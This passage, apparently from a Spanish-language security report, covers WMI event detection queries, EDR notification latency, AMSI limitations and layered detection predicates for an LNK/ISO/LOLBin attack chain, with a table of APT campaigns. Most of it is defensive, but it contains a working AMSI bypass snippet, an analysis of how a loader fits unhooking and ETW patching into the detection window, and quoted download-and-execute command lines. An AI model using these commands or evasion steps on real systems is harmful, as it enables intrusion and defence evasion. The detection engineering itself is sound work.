### 6.2 Taxonomía de Eventos WMI Relevantes

#### 6.2.1 Eventos Intrínsecos

Generados directamente por el repositorio CIM ante operaciones CRUD:

| Clase de Evento | Predicado Disparador | Relevancia para el vector |
|---|---|---|
| `__InstanceCreationEvent` | $\exists\, i: i \notin \mathcal{I}_c(t-1) \wedge i \in \mathcal{I}_c(t)$ | **Central:** Se dispara al crear un proceso (`Win32_Process`) |
| `__InstanceDeletionEvent` | $\exists\, i: i \in \mathcal{I}_c(t-1) \wedge i \notin \mathcal{I}_c(t)$ | Se dispara al terminar un proceso |
| `__InstanceModificationEvent` | $\exists\, i, i': i \in \mathcal{I}_c(t-1) \wedge i' \in \mathcal{I}_c(t) \wedge i.\text{Key} = i'.\text{Key} \wedge i \neq i'$ | Se dispara al modificar un proceso (raramente usado) |

#### 6.2.2 Eventos Extrínsecos

Generados por proveedores WMI como señales asíncronas:

| Clase de Evento | Proveedor WMI | Origen | Relevancia |
|---|---|---|---|
| `Win32_ProcessStartTrace` | Proveedor ETW (`Microsoft-Windows-Kernel-Process`) | Kernel ETW | **Alta:** Cada creación de proceso |
| `Win32_ProcessStopTrace` | Proveedor ETW | Kernel ETW | Media: terminación de proceso |
| `Win32_ThreadStartTrace` | Proveedor ETW | Kernel ETW | Baja: creación de hilo |
| `Win32_ModuleLoadTrace` | Proveedor ETW | Kernel ETW | Baja: carga de módulo (ruidoso) |
| `Win32_DeviceChangeEvent` | Proveedor PnP | Plug and Play | No relevante |
| `RegistryValueChangeEvent` | Proveedor del registro | Registry | Potencial: cambios en registry |
| `Win32_NetworkAdapterChangeEvent` | Proveedor de red | Red | Potencial: conexiones C2 |

### 6.3 Modelo de Eventos como Autómata Híbrido

**Definición 6.3.1 — Autómata Híbrido del Motor de Eventos WQL**

El subsistema de eventos WMI se modela como un autómata híbrido $\mathcal{A}_H = (S, E, \delta, G, \text{Init})$ donde:

- $S$ es el conjunto de estados del sistema observable (modelo CIM en instante $t$)
- $E$ es el conjunto de eventos que provocan transiciones
- $\delta: S \times E \rightarrow S$ es la función de transición
- $G: E \rightarrow \{\text{true}, \text{false}\}$ es la función de guarda (el predicado WQL $\psi$)
- $\text{Init} \in S$ es el estado inicial

**Ejecución del autómata:**

Una traza de ejecución es una secuencia:

$$\rho = (s_0, e_1, s_1, e_2, s_2, \ldots)$$

donde $s_0 = \text{Init}$ y para cada paso $i$: $\delta(s_{i-1}, e_i) = s_i$ si y solo si $G(e_i) = \text{true}$.

**Partición del espacio de eventos:**

$$E = E_{intrinsic} \uplus E_{extrinsic}$$

donde $E_{extrinsic}$ depende del subsistema ETW para su generación, y $E_{intrinsic}$ es generado directamente por el repositorio CIM.

### 6.4 Consultas WQL de Detección Específicas para el Vector

#### 6.4.1 Detección de Creación de Proceso LOLBin desde Explorer

**Consulta:**

```sql
SELECT * FROM __InstanceCreationEvent 
WITHIN 2 
WHERE TargetInstance ISA 'Win32_Process' 
AND TargetInstance.ParentProcessId IN (
    SELECT ProcessId FROM Win32_Process 
    WHERE Name = 'explorer.exe'
)
AND TargetInstance.Name IN ('cmd.exe', 'powershell.exe', 'rundll32.exe', 'mshta.exe', 'certutil.exe')
```

**Formalización del predicado:**

$$\psi_{LOLBin}(e) \iff \text{ParentName}(\text{TargetInstance}(e)) = \text{"explorer.exe"}$$
$$\wedge\; \text{Name}(\text{TargetInstance}(e)) \in \mathcal{B}_{LOL}^{prim}$$

#### 6.4.2 Detección de Cadena de Procesos Sospechosa

**Consulta:**

```sql
SELECT * FROM __InstanceCreationEvent 
WITHIN 5 
WHERE TargetInstance ISA 'Win32_Process' 
AND TargetInstance.Name = 'powershell.exe'
AND TargetInstance.CommandLine LIKE '%-ep bypass%'
AND TargetInstance.CommandLine LIKE '%-w hidden%'
```

**Formalización:**

$$\psi_{chain}(e) \iff \text{Name}(\text{TargetInstance}(e)) = \text{"powershell.exe"}$$
$$\wedge\; \text{Contains}(\text{CommandLine}(e), \text{"-ep bypass"})$$
$$\wedge\; \text{Contains}(\text{CommandLine}(e), \text{"-w hidden"})$$

#### 6.4.3 Detección de Proceso con Argumentos Ocultos (LNK Stomping Indicator)

**Consulta:**

```sql
SELECT * FROM __InstanceCreationEvent 
WITHIN 1 
WHERE TargetInstance ISA 'Win32_Process' 
AND TargetInstance.ParentProcessId IN (
    SELECT ProcessId FROM Win32_Process 
    WHERE Name = 'explorer.exe'
)
AND TargetInstance.CommandLine IS NOT NULL
AND TargetInstance.Name IN ('cmd.exe', 'powershell.exe')
```

**Predicado formal (detección de la contradicción de stomping):**

$$\psi_{stomping}(e) \iff \text{ParentName}(e) = \text{"explorer.exe"}$$
$$\wedge\; \text{Name}(e) \in \mathcal{B}_{LOL}$$
$$\wedge\; \text{CommandLine}(e) \neq \emptyset$$

Esta consulta detecta la **consecuencia** del LNK stomping: un LOLBin siendo ejecutado desde Explorer con argumentos que no deberían existir si el archivo fuera realmente un PDF.

### 6.5 Pipeline de Eventos: De la Generación al Consumo

El flujo completo de un evento desde su generación hasta la activación del consumidor sigue un pipeline de cuatro fases:

```
═══════════════════════════════════════════════════════════════════
     PIPELINE DE EVENTOS WMI EN WINDOWS 11
═══════════════════════════════════════════════════════════════════

FASE 1: GENERACIÓN
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  Kernel ETW Provider                                            │
│  (Microsoft-Windows-Kernel-Process)                             │
│       │                                                         │
│       ├── ProcessStart event                                    │
│       │     PID: 4892                                           │
│       │     Name: cmd.exe                                       │
│       │     ParentPID: 1204 (explorer.exe)                      │
│       │     CommandLine: "/c powershell ..."                    │
│       │                                                         │
│       ▼                                                         │
│  WMI Provider (WmiPerfInst.dll / WmiPrvSE.exe)                  │
│       │                                                         │
│       ├── Crea __InstanceCreationEvent para Win32_Process       │
│       │     TargetInstance = {PID, Name, ParentPID, ...}        │
│       │                                                         │
│       ▼                                                         │
│  Evento en cola del motor de eventos                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                    │
                    ▼
FASE 2: FILTRADO (WQL ψ)
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  Motor WQL evalúa predicado sobre el evento                     │
│                                                                 │
│  __EventFilter:                                                 │
│    Name: "DetectionFilter_001"                                  │
│    QueryLanguage: "WQL"                                         │
│    Query: "SELECT * FROM __InstanceCreationEvent                │
│            WITHIN 2                                             │
│            WHERE TargetInstance ISA 'Win32_Process'             │
│            AND TargetInstance.ParentProcessId IN (...)"         │
│                                                                 │
│  Evaluación:                                                    │
│    TargetInstance.ParentProcessId = PID(explorer.exe)  ✓        │
│    TargetInstance.Name IN {'cmd.exe', ...}             ✓        │
│    ─────────────────────────────────────────────────            │
│    ψ(event) = TRUE  → Evento pasa al filtrado                  │
│                                                                 │
│  Latencia: L_f ∝ |ψ| (longitud del predicado)                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                    │
                    ▼
FASE 3: ENRUTAMIENTO (Filter→Consumer Binding)
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  __FilterToConsumerBinding:                                     │
│    Filter: __EventFilter=@"DetectionFilter_001"                 │
│    Consumer: CommandLineEventConsumer=@"EDR_Consumer_001"        │
│                                                                 │
│  Relación many-to-many:                                         │
│    Un filtro puede activar múltiples consumidores               │
│    Un consumidor puede ser activado por múltiples filtros       │
│                                                                 │
│  Vinculación formal:                                            │
│    B ⊆ F × Cs                                                  │
│    (filter, consumer) ∈ B                                       │
│                                                                 │
│  Latencia: L_d ∝ proceso de despacho                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                    │
                    ▼
FASE 4: CONSUMO
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  __EventConsumer (tipos):                                       │
│                                                                 │
│  ┌──────────────────────────┬───────────────────────────────┐  │
│  │ Tipo de Consumidor       │ Acción                        │  │
│  ├──────────────────────────┼───────────────────────────────┤  │
│  │ ActiveScriptEventConsumer│ Ejecutar VBScript/JScript    │  │
│  │ CommandLineEventConsumer │ Ejecutar línea de comandos    │  │
│  │ ScriptEventConsumer      │ Ejecutar script (variante)    │  │
│  │ LogFileEventConsumer     │ Escribir en archivo de log    │  │
│  │ SMTPEventConsumer        │ Enviar email de notificación  │  │
│  │ NTEventLogEventConsumer  │ Escribir en Event Log         │  │
│  └──────────────────────────┴───────────────────────────────┘  │
│                                                                 │
│  Para EDRs modernos:                                            │
│    → Suscripción directa a ETW (sin pasar por WMI pipeline)    │
│    → Callbacks en kernel mode                                   │
│    → Minifilter drivers                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════
```

### 6.6 Estructura del Repositorio CIM para Suscripciones de Eventos

Las suscripciones de eventos se almacenan en el repositorio CIM como instancias de tres clases interconectadas:

```
Repositorio CIM (C:\Windows\System32\wbem\Repository\)
│
├── __EventFilter instances
│   ├── Name: "ProcessCreationFilter"
│   ├── QueryLanguage: "WQL"
│   ├── Query: "SELECT * FROM __InstanceCreationEvent ..."
│   └── EventNamespace: "root\cimv2"
│
├── __EventConsumer instances
│   ├── Name: "EDR_NotificationConsumer"
│   ├── CommandLineTemplate: "C:\EDR\alert.exe -event %TargetInstance%"
│   └── (o ScriptText para ActiveScript)
│
└── __FilterToConsumerBinding instances
    ├── Filter: __EventFilter=@"ProcessCreationFilter"
    ├── Consumer: __EventConsumer=@"EDR_NotificationConsumer"
    └── DeliverSynchronously: FALSE (async por defecto)
```

**Modelo algebraico de la vinculación:**

La relación $\mathcal{B} \subseteq \mathcal{F} \times \mathcal{C}_s$ es many-to-many. Formalmente:

$$\forall f \in \mathcal{F}: \{c_s \mid (f, c_s) \in \mathcal{B}\} \neq \emptyset \Rightarrow \text{Active}(f)$$

Un filtro está activo si y solo si tiene al menos un consumidor vinculado.

### 6.7 Detección de Suscripciones Maliciosas

Un actor avanzado puede crear sus propias suscripciones de eventos en el repositorio CIM (persistencia WMI). Las consultas para detectar esto son:

**Detección de nuevos filtros:**

```sql
SELECT * FROM __InstanceCreationEvent 
WITHIN 60 
WHERE TargetInstance ISA '__EventFilter'
```

**Detección de nuevos bindings:**

```sql
SELECT * FROM __InstanceCreationEvent 
WITHIN 60 
WHERE TargetInstance ISA '__FilterToConsumerBinding'
```

**Predicado de detección de persistencia WMI:**

$$\psi_{persistence}(e) \iff \text{ISA}(\text{TargetInstance}(e), \text{'\_\_FilterToConsumerBinding'})$$

$$\vee\; (\text{ISA}(\text{TargetInstance}(e), \text{'\_\_EventConsumer'}) \wedge \text{Type}(\text{TargetInstance}(e)) = \text{'CommandLineEventConsumer'})$$

---

## 7. Análisis de la Ventana de Oportunidad: Latencia como Vector Temporal

### 7.1 Modelo de Latencia de Entrega

**Definición 7.1.1 — Latencia de Entrega de Evento**

Sea $t_g$ el instante de generación del evento y $t_c$ el instante de consumo. La latencia total se descompone como:

$$L = t_c - t_g = L_q + L_f + L_d + L_e$$

donde:
- $L_q$ = latencia de encolamiento en el subsistema de eventos (dependiente de la carga del sistema y la frecuencia de polling)
- $L_f$ = latencia de evaluación del filtro WQL (complejidad proporcional a $|\psi|$, la longitud del predicado)
- $L_d$ = latencia de despacho al consumidor (incluye activación del proceso si es `CommandLineEventConsumer`)
- $L_e$ = latencia de ejecución del consumidor (tiempo que el EDR tarda en actuar sobre la alerta)

### 7.2 Mediciones Empíricas de Latencia

| Tipo de consumidor | $L$ observada | Rango | Dependencia |
|---|---|---|---|
| In-process (EDR directo) | 10-100 μs | Microsegundos | Carga del sistema, complejidad del filtro |
| WMI event subscription | 1-5 ms | Milisegundos | Frecuencia de polling del motor WMI |
| CommandLineEventConsumer | 5-50 ms | Milisegundos | Creación de proceso, latencia de disco |
| ActiveScriptEventConsumer | 1-10 ms | Milisegundos | Inicialización de script engine |
| ETW callback (kernel) | 1-50 μs | Microsegundos | Contexto de interrupción |

### 7.3 La Ventana de Oportunidad como Vector Temporal

**Definición 7.3.1 — Ventana de Oportunidad**

$$\text{OpportunityWindow} = [t_g, t_g + L)$$

$$|\text{OpportunityWindow}| = L$$

Durante esta ventana, el proceso anómalo ya ha sido creado pero el EDR aún no ha recibido la notificación. Las operaciones que el cargador (Etapa 4) puede completar dentro de esta ventana incluyen:

| Operación | Tiempo estimado | ¿Cabe en ventana de 1ms? | ¿Cabe en ventana de 50ms? |
|---|---|---|---|
| Resolución PEB → ntdll.dll base | ~0.01 ms | Sí | Sí |
| Parsear EAT de ntdll.dll | ~0.05 ms | Sí | Sí |
| Unhooking de ntdll.dll (~4KB) | ~0.1 ms | Sí | Sí |
| ETW Patching (16 bytes) | ~0.001 ms | Sí | Sí |
| Indirect syscall setup | ~0.01 ms | Sí | Sí |
| NtAllocateVirtualMemory | ~0.005 ms | Sí | Sí |
| Descifrar ASM payload (~64KB) | ~0.5 ms | Sí | Sí |
| NtWriteVirtualMemory | ~0.1 ms | Sí | Sí |
| NtProtectVirtualMemory | ~0.005 ms | Sí | Sí |
| NtCreateThreadEx / NtQueueApcThread | ~0.01 ms | Sí | Sí |
| **Total estimado** | **~0.8 ms** | **Sí** | **Sí** |

**Teorema 7.3.1 — Suficiencia de la Ventana**

*Para un EDR basado en suscripciones WMI de eventos de proceso ($L \geq 1\;\text{ms}$), la ventana de oportunidad es suficiente para que el cargador C++ complete todas las operaciones de evasión (unhooking, ETW patching, inyección) antes de que el EDR reciba la primera notificación.*

**Demostración:**

$$T_{cargador} \approx 0.8\;\text{ms} < 1\;\text{ms} \leq L_{WMI}$$

$$\Rightarrow \text{OpportunityWindow} \supseteq [t_g, t_g + T_{cargador})$$

$$\Rightarrow \text{El cargador completa antes de la detección}$$

$\blacksquare$

### 7.4 Diagrama Temporal de la Ventana

```
═══════════════════════════════════════════════════════════════════
    LÍNEA TEMPORAL: VENTANA DE OPORTUNIDAD DEL VECTOR
═══════════════════════════════════════════════════════════════════

  t=0μs        t≈800μs      t≈1000μs       t≈5000μs
   │              │             │               │
   ▼              ▼             ▼               ▼
───┬──────────────┬─────────────┬───────────────┬─────────────→ t
   │              │             │               │
   │  VENTANA DE OPORTUNIDAD   │               │
   │  ┌────────────────────┐   │               │
   │  │ ETAPA 3:           │   │               │
   │  │ LNK ejecuta cmd.exe│   │               │
   │  │ cmd.exe → powershell│  │               │
   │  │                    │   │               │
   │  │ ETAPA 4:           │   │               │
   │  │ PEB resolution     │   │               │
   │  │ API unhooking      │   │               │
   │  │ ETW patching       │   │               │
   │  │ Indirect syscalls  │   │               │
   │  │ Memory alloc+write │   │               │
   │  │ Thread creation    │   │               │
   │  └────────────────────┘   │               │
   │                           │               │
   │  t_g: Evento generado     │               │
   │  (Win32_ProcessStartTrace)│               │
   │                           │               │
   │                           │  t_c: EDR     │
   │                           │  recibe       │
   │                           │  notificación │
   │                           │               │
   │◄──────── L = 1-50 ms ────►│               │
   │                           │               │
   │  Operaciones completadas: │               │
   │  ✓ ETW parcheado          │               │
   │  ✓ ntdll unhooked         │               │
   │  ✓ Payload inyectado      │               │
   │  ✓ Hilo/APC creado        │               │
   │                           │               │
   │                           │  Demasiado    │
   │                           │  tarde:       │
   │                           │  ETW ya no    │
   │                           │  reporta      │
   │                           │  nada         │

═══════════════════════════════════════════════════════════════════
```

### 7.5 Implicaciones de Seguridad del ETW Patching Post-Ventana

Una operación crítica que ocurre **dentro** de la ventana es el ETW Patching. Tras parchear `EtwEventWrite`:

$$G'_{ETW}: \text{Provider} \times \text{EventDescriptor} \times \text{Payload} \rightarrow \emptyset$$

Los eventos extrínsecos dejan de generarse:

$$E' = E_{intrinsic}$$

Esto significa que **después de la ventana de oportunidad**, incluso si el EDR está activo y procesando eventos, ya no recibe eventos ETW sobre la actividad del proceso inyectado. El autómata híbrido se congela parcialmente:

$$\delta(s, e) \text{ indefinida para } e \in E_{extrinsic}$$

**La ventana de oportunidad tiene un efecto irreversible**: una vez que el ETW está parcheado, el EDR pierde permanentemente la fuente de eventos extrínsecos hasta que se restaure el código original de `EtwEventWrite`.

---

## 8. AMSI como Contramedida y sus Limitaciones Formales

### 8.1 Arquitectura de AMSI

La Antimalware Scan Interface (AMSI) es un estándar de interfaz que permite a las aplicaciones y servicios enviar contenido a las soluciones antimalware para su inspección. AMSI interviene en los siguientes puntos:

| Punto de integración | DLL | Contenido escaneado |
|---|---|---|
| PowerShell | `System.Management.Automation.dll` | Scripts, comandos, expresiones |
| VBScript / JScript | `scrrun.dll` / `jscript.dll` | Scripts |
| Windows Script Host | `wscript.exe` / `cscript.exe` | Scripts |
| Office VBA | `vbe7.dll` | Macros VBA |
| .NET | `clr.dll` | Ensamblados .NET cargados |
| UAC | `consent.exe` | Comandos elevados |
| `wscript.exe` / `cscript.exe` | `jscript9.dll` | Chakra scripts |

### 8.2 Flujo de Escaneo AMSI

```
[1] PowerShell ejecuta: IEX("Invoke-Expression ...")
        │
        ▼
[2] System.Management.Automation.dll
    Detecta contenido potencialmente ejecutable
        │
        ▼
[3] AmsiScanBuffer(buffer, length, contentName, amsiSession, &result)
        │
        ├── AMSI envía buffer al motor AV registrado
        │     (MpOav.dll de Windows Defender, o motor de EDR de terceros)
        │
        ▼
[4] Motor AV evalúa:
        │
        ├── AMSI_RESULT_CLEAN (1)      → Permitir ejecución
        ├── AMSI_RESULT_NOT_DETECTED (2) → Permitir (sin detección conocida)
        ├── AMSI_RESULT_BLOCKED_BY_ADMIN (3) → Bloquear por política
        ├── AMSI_RESULT_DETECTED (4)   → Bloquear ejecución
        └── AMSI_RESULT_INVALID (5)    → Error
        │
        ▼
[5] PowerShell actúa según resultado
```

### 8.3 Formalización de la Interfaz AMSI

**Definición 8.3.1 — Función de Escaneo AMSI**

$$\text{AmsiScan}: \{0,1\}^* \times \text{Session} \rightarrow \{\text{CLEAN}, \text{NOT\_DETECTED}, \text{BLOCKED}, \text{DETECTED}\}$$

La función toma un buffer de bytes y una sesión AMSI, y devuelve un veredicto.

**Definición 8.3.2 — Condición de Bloqueo**

$$\text{ShouldBlock}_{AMSI}(b) \iff \text{AmsiScan}(b, s) \in \{\text{BLOCKED}, \text{DETECTED}\}$$

### 8.4 Limitaciones Formales de AMSI

AMSI tiene limitaciones inherentes que los actores avanzados explotan:

**Limitación 1 — Alcance de integración:**

AMSI solo interviene en aplicaciones que explícitamente llaman a la API de AMSI. Los binarios que no integran AMSI (como `cmd.exe` directamente, o código nativo C/C++ ejecutado desde un LNK) no pasan por AMSI.

$$\text{AMSI\_Scope} = \{b \in \mathcal{B} \mid \text{IntegratesAMSI}(b)\}$$

$$\mathcal{B}_{LOL} \setminus \text{AMSI\_Scope} \neq \emptyset$$

Por ejemplo, `cmd.exe` ejecutando `rundll32.exe` con una DLL no pasa por AMSI.

**Limitación 2 — Evasión por fragmentación:**

AMSI analiza buffers completos. Si el script se fragmenta y cada fragmento individualmente es benigno, AMSI puede no detectar la composición:

$$\text{AmsiScan}(fragment_i, s) = \text{CLEAN} \quad \forall i$$

$$\text{pero}\; \text{Compose}(fragment_1, \ldots, fragment_n) \text{ es malicioso}$$

**Limitación 3 — Patching de AMSI:**

El propio AMSI puede ser parcheado en memoria antes de que se ejecute el script malicioso. PowerShell ejecuta las primeras líneas del script antes de escanearlas, lo que permite:

```powershell
# Estas líneas se ejecutan ANTES del escaneo completo:
$b=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');
$f=$b.GetField('amsiInitFailed','NonPublic,Static');
$f.SetValue($null,$true);
```

**Formalización:**

$$\text{AMSI\_Patched} \Rightarrow \forall b: \text{AmsiScan}(b, s) = \text{CLEAN}$$

**Limitación 4 — Entropía del buffer:**

AMSI opera sobre representaciones textuales de código. Si el código está cifrado/comprimido y se descifra en memoria (como hace el cargador C++ de la Etapa 4), AMSI nunca ve el código descifrado:

$$\text{AmsiScan}(\text{EncryptedPayload}) = \text{CLEAN}$$

$$\text{Decrypt}(\text{EncryptedPayload}) = \text{MaliciousPayload}$$

### 8.5 Análisis de Efectividad de AMSI contra el Vector

| Componente del vector | ¿Pasa por AMSI? | Efectividad |
|---|---|---|
| LNK → cmd.exe | No (cmd.exe no integra AMSI) | **Ninguna** |
| cmd.exe → powershell.exe | Sí, al cargar el script | **Media** (puede evadirse con patching) |
| cmd.exe → rundll32.exe | No (carga DLL nativa) | **Ninguna** |
| cmd.exe → mshta.exe | Sí, al ejecutar HTA | **Media** (puede evadirse) |
| cmd.exe → certutil.exe | No (descarga binaria) | **Ninguna** |
| Cargador C++ (Etapa 4) | No (código nativo C++) | **Ninguna** |
| Payload ASM (Etapa 5) | No (código nativo ASM) | **Ninguna** |

**Conclusión:** AMSI es efectivo solo contra la cadena que involucra PowerShell **si no se parchea**. Para cadenas que usan rundll32, mshta con offuscación, o código nativo, AMSI no proporciona protección.

---

## 9. Superficie de Detección: Predicados de Alerta y Señales Compuestas

### 9.1 Predicados de Detección de Primer Nivel (Individuales)

**Predicado 9.1.1 — LOLBin desde LNK**

$$P_1(L) \iff \text{IsLNK}(L) \wedge \text{Target}(L) \in \mathcal{B}_{LOL}$$

*Señal:* Un archivo LNK que apunta a un LOLBin. Alta tasa de FP en entornos donde los usuarios crean accesos directos legítimos.

**Predicado 9.1.2 — Discrepancia Target/Icono**

$$P_2(L) \iff \text{Target}(L) \neq \text{IconApp}(L)$$

*Señal:* El destino del enlace no coincide con la aplicación cuyo icono se muestra. FP posible cuando los usuarios personalizan iconos.

**Predicado 9.1.3 — Contradicción de Argumentos (LNK Stomping Indicator)**

$$P_3(L) \iff \text{HasArguments}(L) = 0 \wedge \text{ArgsExecuted}(L) \neq \emptyset$$

*Señal:* **Alta confianza.** El flag indica que no hay argumentos, pero la ejecución produce argumentos. Prácticamente no tiene FP legítimos.

**Predicado 9.1.4 — LNK desde Volumen sin Zona (post-ISO montaje)**

$$P_4(L) \iff \text{IsLNK}(L) \wedge L \in V_{mounted} \wedge \text{ZoneAttrib}(L) = \bot$$

*Señal:* LNK dentro de un volumen montado sin atributo de zona. Requiere correlación con la Etapa 1.

**Predicado 9.1.5 — Proceso LOLBin con argumentos ofuscados**

$$P_5(e) \iff \text{Name}(e) \in \mathcal{B}_{LOL} \wedge \text{Entropy}(\text{CommandLine}(e)) > \tau_{entropy}$$

*Señal:* La entropía de los argumentos excede un umbral, indicando posible codificación, cifrado o offuscación.

### 9.2 Predicados de Segundo Nivel (Correlación Temporal)

**Predicado 9.2.1 — Cadena de procesos LOLBin**

$$P_6(t) \iff \exists\, p_1, p_2: \text{Created}(p_1, t) \wedge \text{Created}(p_2, t + \Delta t)$$
$$\wedge\; \text{Parent}(p_2) = p_1 \wedge p_1 \in \mathcal{B}_{LOL} \wedge p_2 \in \mathcal{B}_{LOL}$$

*Señal:* Un LOLBin que ejecuta otro LOLBin como hijo. Por ejemplo, `cmd.exe` → `powershell.exe`.

**Predicado 9.2.2 — Creación de proceso LOLBin post-montaje**

$$P_7(iso, t) \iff \text{IsMounted}(iso, t_0) \wedge t_0 < t < t_0 + \Delta_{window}$$
$$\wedge\; \exists\, p: \text{Created}(p, t) \wedge \text{Parent}(p) = \text{explorer.exe} \wedge p \in \mathcal{B}_{LOL}$$

*Señal:* Un LOLBin creado por Explorer dentro de una ventana temporal tras el montaje de un ISO.

**Predicado 9.2.3 — Ejecución desde directorio de usuario con LOLBin**

$$P_8(e) \iff \text{Name}(e) \in \mathcal{B}_{LOL} \wedge \text{WorkingDir}(e) \subseteq \text{UserProfile}$$

*Señal:* Un LOLBin ejecutándose con directorio de trabajo en la carpeta del usuario (inusual para ejecuciones legítimas del sistema).

### 9.3 Predicados de Tercer Nivel (Señal Compuesta)

**Definición 9.3.1 — Señal Compuesta de Alta Confianza**

$$\text{HighConfidence}(t) \iff \underbrace{P_4(L)}_{\text{LNK en ISO}} \wedge \underbrace{P_2(L)}_{\text{Target ≠ Icon}} \wedge \underbrace{P_6(t)}_{\text{Cadena LOLBin}}$$

$$\vee\; \underbrace{P_3(L)}_{\text{Stomping detectado}}$$

$$\vee\; \underbrace{P_7(iso, t)}_{\text{Post-montaje}} \wedge \underbrace{P_5(e)}_{\text{Args ofuscados}}$$

**Definición 9.3.2 — Función de Confianza Compuesta**

$$\mathcal{T}_{detect}: \Sigma \rightarrow [0, 1]$$

$$\mathcal{T}_{detect}(\sigma) = 1 - \prod_{i \in A} (1 - w_i \cdot P_i(\sigma))$$

donde $A$ es el conjunto de predicados activados y $w_i \in [0, 1]$ es el peso de confianza del predicado $i$:

| Predicado | Peso $w_i$ | Justificación |
|---|---|---|
| $P_3$ (Stomping) | 0.95 | Prácticamente no tiene FP |
| $P_4 \wedge P_2$ (LNK en ISO + discrepancia) | 0.90 | Altamente anómalo en combinación |
| $P_7 \wedge P_5$ (Post-montaje + args ofuscados) | 0.85 | Fuerte indicador temporal |
| $P_6$ (Cadena LOLBin) | 0.60 | Posible en entornos de administración |
| $P_1$ (LOLBin desde LNK) | 0.30 | Demasiado genérico solo |
| $P_2$ (Target ≠ Icon) | 0.40 | Posible con personalización |

### 9.4 Tabla Consolidada de Superficies de Detección

| Nivel | Señal | Predicado | Subsistema | FP estimada |
|---|---|---|---|---|
| 1 | LOLBin desde LNK | $P_1$ | YARA/Sigma | Alta |
| 1 | Target ≠ Icono | $P_2$ | Shell Link analysis | Media |
| 1 | Stomping (flag contradicción) | $P_3$ | Shell Link analysis | **Muy baja** |
| 1 | LNK en volumen sin zona | $P_4$ | Correlación ISO/MotW | Baja |
| 1 | Args ofuscados | $P_5$ | Entropy analysis | Baja |
| 2 | Cadena LOLBin | $P_6$ | WQL / ETW process | Media |
| 2 | Post-montaje LOLBin | $P_7$ | Correlación temporal | Baja |
| 2 | LOLBin en directorio usuario | $P_8$ | ETW process | Media |
| 3 | **Señal compuesta** | $P_4 \wedge P_2 \wedge P_6$ | Multi-subsystem | **Muy baja** |
| 3 | **Señal compuesta** | $P_3$ (solo) | Shell Link | **Muy baja** |

### 9.5 Implementación de Detección con ETW + WQL

**Para implementación con ETW directo (sin pipeline WMI):**

```
Microsoft-Windows-Kernel-Process provider:
  EventID: 1 (ProcessStart)
  Fields:
    ProcessID: DWORD
    ParentProcessID: DWORD
    ImageFileName: UNICODE_STRING
    CommandLine: UNICODE_STRING
    
Regla de correlación:
  IF ProcessStart.ImageFileName IN {'cmd.exe', 'powershell.exe', 'rundll32.exe', 'mshta.exe'}
  AND ProcessStart.ParentProcessID == PID('explorer.exe')
  THEN:
    INCREMENT suspicious_lolbin_counter
    LOG(ProcessStart.ImageFileName, ProcessStart.CommandLine)
    IF ProcessStart.CommandLine MATCHES regex('/c |powershell|rundll32|mshta')
      THEN ALERT(Severity=HIGH, Rule="LOLBin from Explorer with suspicious args")
```

**Para implementación con WQL (suscripción persistente):**

```sql
-- Suscripción en repositorio CIM
INSERT INTO __EventFilter (Name, QueryLanguage, Query)
VALUES (
  'ProcessCreation_LOLDetection',
  'WQL',
  'SELECT * FROM __InstanceCreationEvent WITHIN 2 
   WHERE TargetInstance ISA ''Win32_Process'' 
   AND TargetInstance.ParentProcessId IN (
     SELECT ProcessId FROM Win32_Process WHERE Name = ''explorer.exe''
   )
   AND TargetInstance.Name IN (''cmd.exe'',''powershell.exe'',''rundll32.exe'',''mshta.exe'')'
);

INSERT INTO __FilterToConsumerBinding (Filter, Consumer)
VALUES (
  '__EventFilter.Name="ProcessCreation_LOLDetection"',
  'CommandLineEventConsumer.Name="EDR_Alert_Processor"'
);
```

---

## 10. Historial de Explotación APT y Contexto Operacional

### 10.1 Cronología de Adopción de LOLBins por Actores de Amenaza

| Período | Evento | Significado |
|---|---|---|
| 2015-2017 | Investigación académica sobre LOLBins; creación de LOLBAS Project | Catalogación formal del arsenal |
| 2018 | APT groups comienzan a usar LOLBins para evadir EDRs | Transición de malware tradicional a fileless |
| 2019 | LOLBins se convierte en técnica estándar en operaciones APT | Normalización de la técnica |
| 2020 | Documentación de MITRE ATT&CK T1218 (System Binary Proxy Execution) | Clasificación formal |
| 2021 | Masiva adopción de LNK + LOLBins con contenedores ISO | Etapa 1 + Etapa 3 combinadas |
| 2022 | LNK Stomping documentado como técnica de evasión | Refinamiento de la técnica |
| 2023 | Diversificación: múltiples cadenas LOLBins en una sola campaña | Polimorfismo de la cadena |
| 2024 | EDRs mejoran detección de cadenas LOLBin → actores migran a técnicas nativas | Carrera armamentista continua |

### 10.2 Documentación de Campañas por LOLBin Utilizado

**cmd.exe:**
| Campaña | Actor | Período | Uso |
|---|---|---|---|
| Emotet Wave 5 | Mummy Spider | 2021-2022 | `cmd.exe /c powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('...')"` |
| IcedID | TA580 | 2021-2023 | `cmd.exe /c rundll32 %APPDATA%\temp.dll,#1` |
| QakBot | TA570 | 2022-2023 | `cmd.exe /c echo [script] > %temp%\s.ps1 && powershell -f %temp%\s.ps1` |

**powershell.exe:**
| Campaña | Actor | Período | Uso |
|---|---|---|---|
| Magniber | Actores coreanos | 2022 | `powershell -ep bypass -w hidden -c "IEX(irm '...')"` |
| Cobalt Strike delivery | Diversos | 2020-2024 | `powershell -nop -w hidden -encodedcommand [base64]` |
| APT29 | Cozy Bear | 2021-2022 | PowerShell con ofuscación avanzada + AMSI bypass |

**rundll32.exe:**
| Campaña | Actor | Período | Uso |
|---|---|---|---|
| BazarLoader | TA551 | 2021 | `rundll32.exe %TEMP%\loader.dll,DllRegisterServer` |
| Emotet DLL | Mummy Spider | 2022 | `rundll32.exe %TEMP%\doc.dll,#1` |
| Trickbot | Wizard Spider | 2020-2022 | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"` |

**mshta.exe:**
| Campaña | Actor | Período | Uso |
|---|---|---|---|
| FIN7 | Carbon Spider | 2021 | `mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('...',0);"` |
